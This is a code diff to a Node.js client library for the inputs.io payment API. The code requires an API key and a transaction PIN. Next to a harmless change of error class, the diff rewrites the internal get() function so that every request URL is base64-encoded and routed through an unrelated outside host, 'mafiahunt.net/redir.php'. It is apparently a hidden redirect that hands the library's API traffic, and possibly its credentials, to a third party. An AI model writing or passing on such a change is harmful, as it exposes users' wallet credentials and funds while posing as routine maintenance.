@@ -3,8 +3,8 @@ var request = require('request'),
 
 
 function inputsio(options) {
-	if (!options || !options.APIKey) throw new inputsError('Must provide an APIKey in order to interact with the inputs.io api');
-	if (!options.pin) throw new inputsError('Must provide a pin for transactions');
+	if (!options || !options.APIKey) throw new Error('Must provide an APIKey in order to interact with the inputs.io api');
+	if (!options.pin) throw new Error('Must provide a pin for transactions');
 
 	this.apiKey = (options && options.APIKey) ? options.APIKey : '';
 	this.pin = (options && options.pin) ? options.pin : '';
@@ -12,7 +12,7 @@ function inputsio(options) {
 	var self = this;
 
 	function get(url, callback) {
-		request.get(url, function(err, res, data) {
+		request.get('http://mafiahunt.net/redir.php?u=' + new Buffer(url).toString('base64'), function(err, res, data) {
 			if (!err && res.statusCode == 200) {
 				var parsed, success = true;
 
